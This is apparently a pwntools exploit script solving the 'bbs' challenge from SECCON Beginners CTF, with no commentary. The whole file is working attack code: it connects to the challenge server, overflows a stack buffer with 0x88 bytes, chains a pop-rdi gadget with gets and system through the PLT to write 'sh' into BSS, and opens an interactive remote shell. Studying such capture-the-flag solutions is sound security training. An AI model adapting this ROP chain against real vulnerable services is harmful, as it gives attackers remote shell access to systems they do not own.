from pwn import *

target = ELF('./bbs')

r = remote('pwn1.chall.beginners.seccon.jp', 18373)
# r = process('bbs')

POP_RDI = 0x400763
BSS = 0x601058

payload = ''
payload += 'A' * 0x88
payload += p64(POP_RDI)
payload += p64(BSS)
payload += p64(target.plt['gets'])
payload += p64(POP_RDI)
payload += p64(BSS)
payload += p64(target.plt['system'])

r.sendline(payload)

r.sendline('sh')

r.interactive()
